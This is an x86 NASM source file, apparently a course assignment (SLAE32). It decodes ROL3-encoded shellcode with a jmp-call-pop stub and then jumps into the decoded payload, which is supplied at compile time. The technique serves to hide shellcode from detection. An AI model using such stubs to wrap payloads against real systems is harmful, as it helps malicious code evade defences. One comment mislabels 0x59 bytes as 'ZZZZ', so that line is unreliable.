; decoder.nasm - A decoder for ROL3 shellcode
; Assignment 4 of SLAE32 course
; 2018-07-05 Thomas Karpiniec

; Compile with encoded PAYLOAD
;     nasm -f elf32 -o decoder.o -DPAYLOAD="\x31..." decoder.nasm

global _start
       
_start:
	jmp short payload_to_stack

decoder:
	; Need to rotate each byte once to the right
	pop edi	  	 ; remember where the start is
	mov esi, edi	 ; copy to esi, which we'll use as our walking ptr

loop:
	mov eax, [esi]
	cmp eax, 0x59595959	; if equal, we've finished
	je run_shellcode
	ror al, 3		; otherwise rotate the bottom byte
	mov [esi], eax		; and put it back
	inc esi	   		; shift up one byte
	jmp loop		; keep going

run_shellcode:
	jmp edi

payload_to_stack:
	; Place ptr to PAYLOAD on the stack and jump
	call decoder
	db PAYLOAD
	db 0x59, 0x59, 0x59, 0x59	; "ZZZZ"


	
	